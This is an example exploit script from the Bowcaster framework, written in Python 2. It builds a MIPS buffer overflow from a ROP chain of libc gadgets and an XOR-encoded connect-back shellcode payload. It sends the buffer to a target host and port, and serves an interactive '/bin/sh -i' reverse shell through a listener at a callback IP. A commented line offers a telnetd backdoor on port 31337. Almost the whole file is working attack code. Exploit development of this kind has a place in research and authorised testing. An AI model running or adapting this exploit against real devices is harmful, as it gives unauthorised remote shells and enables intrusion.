#!/usr/bin/env python
# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 


#This is an exmaple using Crossbow's OverflowBuffer and SectionCreator classes
#to build a buffer overflow

import os
import struct
import sys
import socket
import signal
import time

from bowcaster.development.overflowbuilder import *
from bowcaster.common.support import LittleEndian,Logging
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.encoders.mips import *


#from bowcaster.encoders.mips import MipsUpperAlphaEncoder
logger=Logging()

CALLBACK_IP="192.168.127.10"
CALLBACK_PORT="8080"

qemu=False

libc_qemu_base=0x4084a000
libc_actual_base=0x2aaee000
libc_base=0

if qemu:
    libc_base=libc_qemu_base
else:
    libc_base=libc_actual_base
badchars=['\0',0x0d,'\n',0x20]

SC=SectionCreator(LittleEndian,base_address=libc_base,badchars=badchars)

#function_epilogue_rop
SC.gadget_section(528,0x31b44,
            description="[$ra] function epilogue that sets up $s1-$s7")

#Sleep arg 2 into $a0, stack data into $ra, then jalr $s0
SC.gadget_section(656,0x43880,
            description="[$a0] Set up 2 sec arg to sleep(), then jalr $s1")

#address of sleep
SC.gadget_section(620,0x506c0,
            description="Address of sleep() in libc. be sure to set up $ra and $a0 before calling.")

#placeholder address that can be dereferenced without crashing, this goes in $s2
SC.gadget_section(628,0x427a4,
            description="[$s2] placeholder, derefed without crashing.")

#stackfinder. add 0xe0+var_c0 + $sp into $s0, jalr $s6
SC.gadget_section(688,0x427a4,description="stackfinder.")

#stackjumber. jalr $s0
SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")

#Or non-interactive exploitation:
#connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)

payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)

try:
    encoded_payload=MipsXorEncoder(payload,key=0xecb9dcb4,badchars=badchars)
except EncoderException as ee:
    print ee
    sys.exit(1)
    
#encoded_payload=MipsUpperAlphaEncoder(payload,LittleEndian,badchars=badchars)
SC.string_section(700,encoded_payload.shellcode,
            description="encoded connect back payload")

logger.LOG_DEBUG("length of encoded shellcode, including stub is: %d" % len(encoded_payload.shellcode))
#print encoded_payload.pretty_string()

buf=OverflowBuffer(LittleEndian,1300,SC.section_list)
logger.LOG_DEBUG("Length of overflow: %d" % buf.len())
if len(sys.argv) == 2:
    search_value=sys.argv[1]
    if search_value.startswith("0x"):
        value=int(search_value,16)
    offset=buf.find_offset(value)
    if(offset < 0):
        print "Couldn't find value %s in the overflow buffer." % search_value
    else:
        print "Found value %s at\noffset: %d" % (search_value,offset)
    exit(0)

addr=sys.argv[1]
port=int(sys.argv[2])

connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
pid=connectback_server.serve()
time.sleep(1)
if pid:
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((addr,port))
        logger.LOG_INFO("sending exploit.")
        sock.send(str(buf))
        sock.close()
        connectback_server.wait()
    except Exception as e:
        logger.LOG_WARN("Failed to connect. ")
        logger.LOG_WARN("Failed to connect. Killing connect-back server.")
        connectback_server.shutdown()
else:
    logger.LOG_WARN("Failed to start connect-back server.")
    sys.exit(1)


